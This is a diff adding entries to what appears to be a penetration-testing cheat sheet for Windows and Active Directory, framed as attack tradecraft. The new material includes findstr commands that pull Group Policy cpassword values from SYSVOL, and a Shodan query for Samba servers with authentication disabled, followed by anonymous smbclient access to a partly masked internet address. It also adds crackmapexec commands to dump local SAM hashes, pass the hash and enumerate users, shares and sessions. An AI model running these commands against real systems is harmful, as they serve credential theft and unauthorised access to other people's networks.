@@ -314,6 +314,13 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
+## Find GPP Passwords in SYSVOL:
+
+```
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
+```
+
 ## Searching the Registry for Passwords:
 
 ```
@@ -715,6 +722,18 @@ Downloads text formatted files
 ```
 certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
 ```
+## Shodan for SMB:
+
+SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
+
+```
+"Authentication: disabled" port:445 product:"Samba" 
+```
+
+```
+smbclient -L //200.x.x.29/ -N  
+smbclient //200.x.x.29/info
+```
 
 ## Plundering Account Information with RPCClient and SMBClient:
 
@@ -866,4 +885,45 @@ Connect to target using local account:
 
 ```
 crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth
+```
+
+Dump local SAM hashes:
+
+```
+crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
+```
+
+#### Enumerate Everything:
+
+> [!NOTE]
+> Some enumeration methods may fail depending on the privilege level of the user you're authenticating as
+
+Password authentication:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -p 'password' \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
+```
+
+Pass the hash:
+
+```
+crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
+--shares \
+--sessions \
+--disks \
+--loggedon-users \
+--users \
+--groups \
+--computers \
+--local-groups \
+--pass-pol
 ```
